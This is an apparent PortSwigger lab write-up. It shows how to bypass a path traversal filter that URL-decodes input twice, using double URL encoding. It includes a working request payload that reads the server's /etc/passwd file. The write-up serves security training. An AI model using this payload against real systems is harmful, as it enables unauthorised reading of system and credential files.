# File path traversal, traversal sequences stripped with superfluous URL-decode

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode), you'll learn: File path traversal, traversal sequences stripped with superfluous URL-decode! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks input containing [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021236.png)

**In the previous labs, we found that there is a file path traversal vulnerability in the display of product images:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021340.png)

**Also, in the lab background, it said:**

> The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

**To bypass that, we can use double URL encoding:**

**To do so, I'll use [CyberChef](https://gchq.github.io/CyberChef/) to do URL encoding:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021554.png)

**Now, we can use `%252E%252E%252F` as `../`:**
```
# Before URL encoded
/image?filename=../../../etc/passwd

# After double URL encoded
/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F/etc/passwd
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021658.png)

# What we've learned:

1. File path traversal, traversal sequences stripped with superfluous URL-decode